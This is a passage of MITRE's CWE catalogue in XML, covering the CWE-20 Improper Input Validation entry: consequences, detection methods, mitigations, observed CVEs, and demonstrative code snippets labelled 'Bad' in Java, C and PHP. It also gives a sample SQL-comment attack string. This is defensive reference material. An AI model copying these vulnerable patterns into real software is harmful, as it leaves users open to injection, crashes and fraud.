               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Functional_Areas, Observed_Examples, References, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Detection_Factors</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>"Mapping CWE to 62443" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-04-25</Contribution_Date>
               <Contribution_Comment>Suggested mappings to ISA/IEC 62443.</Contribution_Comment>
            </Contribution>
            <Previous_Entry_Name Date="2009-01-12">Integer Overflow (Wrap or Wraparound)</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="20" Name="Improper Input Validation" Abstraction="Class" Structure="Simple" Status="Stable">
        <Description>The product receives input or data, but it does
        not validate or incorrectly validates that the input has the
        properties that are required to process the data safely and
        correctly.</Description>
         <Extended_Description>
	   <xhtml:p>Input validation is a frequently-used technique
	   for checking potentially dangerous inputs in order to
	   ensure that the inputs are safe for processing within the
	   code, or when communicating with other components.  When
	   software does not validate input properly, an attacker is
	   able to craft the input in a form that is not expected by
	   the rest of the application. This will lead to parts of the
	   system receiving unintended input, which may result in
	   altered control flow, arbitrary control of a resource, or
	   arbitrary code execution.</xhtml:p>
	   <xhtml:p>Input validation is not the only technique for
	   processing input, however.  Other techniques attempt to
	   transform potentially-dangerous input into something safe, such
	   as filtering (CWE-790) - which attempts to remove dangerous
	   inputs - or encoding/escaping (CWE-116), which attempts to
	   ensure that the input is not misinterpreted when it is included
	   in output to another component. Other techniques exist as well
	   (see CWE-138 for more examples.)</xhtml:p>
	   <xhtml:p>Input validation can be applied to:</xhtml:p>
	   <xhtml:ul>
	     <xhtml:li>raw data - strings, numbers, parameters, file contents, etc.</xhtml:li>
	     <xhtml:li>metadata - information about the raw data, such as headers or size</xhtml:li>
	   </xhtml:ul>
	   <xhtml:p>Data can be simple or structured.  Structured data
	   can be composed of many nested layers, composed of
	   combinations of metadata and raw data, with other simple or
	   structured data.</xhtml:p>
	   <xhtml:p>Many properties of raw data or metadata may need
	   to be validated upon entry into the code, such
	   as:</xhtml:p>
	   <xhtml:ul>
	     <xhtml:li>specified quantities such as size, length, frequency, price, rate, number of operations, time, etc.</xhtml:li>
	     <xhtml:li>implied or derived quantities, such as the actual size of a file instead of a specified size</xhtml:li>
	     <xhtml:li>indexes, offsets, or positions into more complex data structures</xhtml:li>
	     <xhtml:li>symbolic keys or other elements into hash tables, associative arrays, etc.</xhtml:li>
	     <xhtml:li>well-formedness, i.e. syntactic correctness - compliance with expected syntax </xhtml:li>
	     <xhtml:li>lexical token correctness - compliance with rules for what is treated as a token</xhtml:li>
	     <xhtml:li>specified or derived type - the actual type of the input (or what the input appears to be)</xhtml:li>
	     <xhtml:li>consistency - between individual data elements, between raw data and metadata, between references, etc.</xhtml:li>
	     <xhtml:li>conformance to domain-specific rules, e.g. business logic </xhtml:li>
	     <xhtml:li>equivalence - ensuring that equivalent inputs are treated the same</xhtml:li>
	     <xhtml:li>authenticity, ownership, or other attestations about the input, e.g. a cryptographic signature to prove the source of the data</xhtml:li>
	   </xhtml:ul>
	   <xhtml:p>Implied or derived properties of data must often
	   be calculated or inferred by the code itself.  Errors in
	   deriving properties may be considered a contributing factor
	   to improper input validation.
	   </xhtml:p>
	   <xhtml:p>Note that "input validation" has very different
	   meanings to different people, or within different
	   classification schemes.  Caution must be used when
	   referencing this CWE entry or mapping to it.  For example,
	   some weaknesses might involve inadvertently giving control
	   to an attacker over an input when they should not be able
	   to provide an input at all, but sometimes this is referred
	   to as input validation.</xhtml:p>
	   <xhtml:p>Finally, it is important to emphasize that the
	   distinctions between input validation and output escaping
	   are often blurred, and developers must be careful to
	   understand the difference, including how input validation
	   is not always sufficient to prevent vulnerabilities,
	   especially when less stringent data types must be
	   supported, such as free-form text. Consider a SQL injection
	   scenario in which a person's last name is inserted into a
	   query. The name "O'Reilly" would likely pass the validation
	   step since it is a common last name in the English
	   language. However, this valid name cannot be directly
	   inserted into the database because it contains the "'"
	   apostrophe character, which would need to be escaped or
	   otherwise transformed. In this case, removing the
	   apostrophe might reduce the risk of SQL injection, but it
	   would produce incorrect behavior because the wrong name
	   would be recorded.</xhtml:p>
       </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="707" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="345" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="22" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="41" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="74" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="119" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="770" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Often"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>
                  <xhtml:p>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</xhtml:p>
                  <xhtml:p>If a programmer believes that an attacker cannot modify certain inputs, then the programmer might not perform any input validation at all. For example, in web applications, many programmers believe that cookies and hidden form fields can not be modified from a web browser (CWE-472), although they can be altered using a proxy or a custom program. In a client-server architecture, the programmer might assume that client-side security checks cannot be bypassed, even when a custom client could be written that skips those checks (CWE-602).</xhtml:p>
               </Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Impact>DoS: Resource Consumption (CPU)</Impact>
               <Impact>DoS: Resource Consumption (Memory)</Impact>
               <Note>An attacker could provide unexpected values and cause a program crash or excessive consumption of resources, such as memory and CPU.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Memory</Impact>
               <Impact>Read Files or Directories</Impact>
               <Note>An attacker could read confidential data if they are able to control resource references.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Modify Memory</Impact>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>An attacker could use malicious input to modify data or possibly alter control flow in unexpected ways, including arbitrary command execution.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-3">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>Some instances of improper input validation can be detected using automated static analysis.</xhtml:p>
                  <xhtml:p>A static analysis tool might allow the user to specify which application-specific methods or functions perform input validation; the tool might also have built-in knowledge of validation frameworks such as Struts. The tool may then suppress or de-prioritize any associated warnings. This allows the analyst to focus on areas of the software in which input validation does not appear to be present.</xhtml:p>
                  <xhtml:p>Except in the cases described in the previous paragraph, automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes.</xhtml:p>
               </Description>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-4">
               <Method>Manual Static Analysis</Method>
               <Description>When custom input validation is required, such as when enforcing business rules, manual analysis is necessary to ensure that the validation is properly implemented.</Description>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-5">
               <Method>Fuzzing</Method>
               <Description>Fuzzing techniques can be useful for detecting input validation errors. When unexpected inputs are provided to the software, the software should not crash or otherwise become unstable, and it should generate application-controlled error messages. If exceptions or interpreter-generated error messages occur, this indicates that the input was not detected and handled within the application logic itself.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Host Application Interface Scanner</xhtml:li>
                           <xhtml:li>Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Attack Modeling</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>Consider using language-theoretic security (LangSec) techniques that characterize inputs using a formal language and build "recognizers" for that language.  This effectively requires parsing to be a distinct layer that effectively enforces a boundary between raw input and internal data representations, instead of allowing parser code to be scattered throughout the program, where it could be subject to errors or inconsistencies that create weaknesses. [REF-1109] [REF-1110] [REF-1111]</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-7">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>Use an input validation framework such as Struts or the OWASP ESAPI Validation API. Note that using a framework does not automatically address all input validation problems; be mindful of weaknesses that could arise from misusing the framework itself (CWE-1173).</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-6">
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
               </Description>
	       <Effectiveness>High</Effectiveness>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</xhtml:p>
                  <xhtml:p>Even though client-side checks provide minimal benefits with respect to server-side security, they are still useful. First, they can support intrusion detection. If the server receives input that should have been rejected by the client, then it may be an indication of an attack. Second, client-side error-checking can provide helpful feedback to the user about the expectations for valid input. Third, there may be a reduction in server-side processing time for accidental input errors, although this is typically a small savings.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>When your application combines data from multiple sources, perform the validation after the sources have been combined. The individual data elements may pass the validation step but violate the intended restrictions after they have been combined.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-35">
               <Phase>Implementation</Phase>
               <Description>Be especially careful to validate all input when invoking code that crosses language boundaries, such as from an interpreted language to native code. This could create an unexpected interaction between the language boundaries. Ensure that you are not violating any of the expectations of the language with which you are interfacing. For example, even though Java may not be susceptible to buffer overflows, providing a large argument in a call to native code might trigger an overflow.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Directly convert your input type into the expected data type, such as using a conversion function that translates a string into a number. After converting to the expected data type, ensure that the input's values fall within the expected range of allowable values and that multi-field consistencies are maintained.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180, CWE-181). Make sure that your application does not inadvertently decode the same input twice (CWE-174). Such errors could be used to bypass allowlist schemes by introducing dangerous inputs after they have been checked. Use libraries such as the OWASP ESAPI Canonicalization control.</xhtml:p>
                  <xhtml:p>Consider performing repeated canonicalization until your input does not change any more. This will avoid double-decoding and similar scenarios, but it might inadvertently modify inputs that are allowed to contain properly-encoded dangerous content.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>When exchanging data between components, ensure that both components are using the same character encoding. Ensure that the proper encoding is applied at each interface. Explicitly set the encoding you are using whenever the protocol allows you to do so.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-135">
               <Intro_Text>This example demonstrates a shopping interaction in which the user is free to specify the quantity of items to be purchased and a total is calculated.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>public static final double price = 20.00;<xhtml:br/>int quantity = currentUser.getAttribute("quantity");<xhtml:br/>double total = price * quantity;<xhtml:br/>chargeUser(total);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The user has no control over the price variable, however the code does not prevent a negative value from being specified for quantity. If an attacker were to provide a negative value, then the user would have their account credited instead of debited.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-136">
               <Intro_Text>This example asks the user for a height and width of an m X n game board with a maximum dimension of 100 squares.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>...<xhtml:br/>#define MAX_DIM 100<xhtml:br/>...<xhtml:br/>
                     <xhtml:i>/* board dimensions */</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>int m,n, error;<xhtml:br/>board_square_t *board;<xhtml:br/>printf("Please specify the board height: \n");<xhtml:br/>error = scanf("%d", &amp;m);<xhtml:br/>if ( EOF == error ){<xhtml:div style="margin-left:1em;">die("No integer passed: Die evil hacker!\n");</xhtml:div>}<xhtml:br/>printf("Please specify the board width: \n");<xhtml:br/>error = scanf("%d", &amp;n);<xhtml:br/>if ( EOF == error ){<xhtml:div style="margin-left:1em;">die("No integer passed: Die evil hacker!\n");</xhtml:div>}<xhtml:br/>if ( m &gt; MAX_DIM || n &gt; MAX_DIM ) {<xhtml:div style="margin-left:1em;">die("Value too large: Die evil hacker!\n");</xhtml:div>}<xhtml:br/>board = (board_square_t*) malloc( m * n * sizeof(board_square_t));<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>While this code checks to make sure the user cannot specify large, positive integers and consume too much memory, it does not check for negative values supplied by the user. As a result, an attacker can perform a resource consumption (CWE-400) attack against this program by specifying two, large negative values that will not overflow, resulting in a very large memory allocation (CWE-789) and possibly a system crash. Alternatively, an attacker can provide very large negative values which will cause an integer overflow (CWE-190) and unexpected behavior will follow depending on how the values are treated in the remainder of the program.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following example shows a PHP application in which the programmer attempts to display a user's birthday and homepage.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>$birthday = $_GET['birthday'];<xhtml:br/>$homepage = $_GET['homepage'];<xhtml:br/>echo "Birthday: $birthday&lt;br&gt;Homepage: &lt;a href=$homepage&gt;click here&lt;/a&gt;"</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer intended for $birthday to be in a date format and $homepage to be a valid URL. However, since the values are derived from an HTTP request, if an attacker can trick a victim into clicking a crafted URL with &lt;script&gt; tags providing the values for birthday and / or homepage, then the script will run on the client's browser when the web server echoes the content. Notice that even if the programmer were to defend the $birthday variable by restricting input to integers and dashes, it would still be possible for an attacker to provide a string of the form:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>2009-01-09--</xhtml:div>
               </Example_Code>
               <Body_Text>If this data were used in a SQL statement, it would treat the remainder of the statement as a comment. The comment could disable other security-related logic in the statement. In this case, encoding combined with input validation would be a more useful protection mechanism.</Body_Text>
               <Body_Text>Furthermore, an XSS (CWE-79) attack or SQL injection (CWE-89) are just a few of the potential consequences when input validation is not used. Depending on the context of the code, CRLF Injection (CWE-93), Argument Injection (CWE-88), or Command Injection (CWE-77) may also be possible.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-34">
               <Intro_Text>The following example takes a user-supplied value to allocate an array of objects and then operates on the array.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>private void buildList ( int untrustedListSize ){<xhtml:div style="margin-left:1em;">if ( 0 &gt; untrustedListSize ){<xhtml:div style="margin-left:1em;">die("Negative value supplied for list size, die evil hacker!");</xhtml:div>}<xhtml:br/>Widget[] list = new Widget [ untrustedListSize ];<xhtml:br/>list[0] = new Widget();</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This example attempts to build a list from a user-specified value, and even checks to ensure a non-negative value is supplied. If, however, a 0 value is provided, the code will build an array of size 0 and then try to store a new Widget in the first location, causing an exception to be thrown.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-110">
               <Intro_Text>This Android application has registered to handle a URL when sent an intent:</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i>...</xhtml:i>
                     <xhtml:br/>IntentFilter filter = new IntentFilter("com.example.URLHandler.openURL");<xhtml:br/>MyReceiver receiver = new MyReceiver();<xhtml:br/>registerReceiver(receiver, filter);<xhtml:br/>
                     <xhtml:i>...</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>public class UrlHandlerReceiver extends BroadcastReceiver {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>@Override<xhtml:br/>public void onReceive(Context context, Intent intent) {<xhtml:div style="margin-left:1em;">
                              <xhtml:div>if("com.example.URLHandler.openURL".equals(intent.getAction())) {<xhtml:div style="margin-left:1em;">String URL = intent.getStringExtra("URLToOpen");<xhtml:br/>int length = URL.length();</xhtml:div>
                                 <xhtml:br/>
                                 <xhtml:i>...</xhtml:i>
                                 <xhtml:br/>}</xhtml:div>
                           </xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The application assumes the URL will always be included in the intent. When the URL is not present, the call to getStringExtra() will return null, thus causing a null pointer exception when length() is called.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-45918</Reference>
               <Description>Chain: a learning management tool debugger uses external input to locate previous session logs (CWE-73) and does not properly validate the given path (CWE-20), allowing for filesystem path traversal using "../" sequences (CWE-24)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-45918</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-30860</Reference>
               <Description>Chain: improper input validation (CWE-20) leads to integer overflow (CWE-190) in mobile OS, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-30860</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-30663</Reference>
               <Description>Chain: improper input validation (CWE-20) leads to integer overflow (CWE-190) in mobile OS, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-30663</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-22205</Reference>
               <Description>Chain: backslash followed by a newline can bypass a validation step (CWE-20), leading to eval injection (CWE-95), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-22205</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-21220</Reference>
               <Description>Chain: insufficient input validation (CWE-20) in browser allows heap corruption (CWE-787), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-21220</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-9054</Reference>
               <Description>Chain: improper input validation (CWE-20) in username parameter, leading to OS command injection (CWE-78), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-9054</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-3452</Reference>
               <Description>Chain: security product has improper input validation (CWE-20) leading to directory traversal (CWE-22), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-3452</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-3161</Reference>
               <Description>Improper input validation of HTTP requests in IP phone, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-3161</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-3580</Reference>
               <Description>Chain: improper input validation (CWE-20) in firewall product leads to XSS (CWE-79), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-3580</Link>
            </Observed_Example>
            <Observed_Example>
            <Reference>CVE-2021-37147</Reference>
            <Description>Chain: caching proxy server has improper input validation (CWE-20) of headers, allowing HTTP response smuggling (CWE-444) using an "LF line ending"</Description>
